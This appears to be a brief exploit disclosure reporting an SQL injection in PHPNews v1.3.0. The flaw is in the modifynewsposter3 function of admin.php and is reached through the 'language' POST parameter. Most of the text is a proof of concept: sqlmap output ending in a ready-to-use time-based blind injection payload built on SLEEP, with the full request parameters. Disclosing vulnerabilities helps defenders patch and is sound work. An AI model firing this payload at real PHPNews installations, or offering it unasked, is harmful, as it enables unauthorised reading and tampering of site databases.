# Exploit Title: PHPNews v1.3.0 - Sql Injection(SQLi)
## Date: 1/4/2024
## Vendor Homepage: https://sourceforge.net/projects/newsphp/files/PHPNews%201._/PHPNews%201.3.0/phpnews_1-3-0.zip/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHPNews
## Version: v1.3.0
## Exploit Description:
## PHPNews v1.3.0 suffers from SQLi - Sql Injection Vulnerability in modifynewsposter3 function in admin.php allowing attackers to execute arbitrary SQL commands via the language parameter in an HTTP POST request.

## ---------------------------------POC-----------------------------
```
POST parameter 'language' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 86 HTTP(s) requests:
---
Parameter: language (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=5&newusername=user4&username=user4&password=&password2=&email=user4@test.com&avatar=&language=en_GB' AND (SELECT 4843 FROM (SELECT(SLEEP(5)))XLId) AND 'SZhc'='SZhc
---
```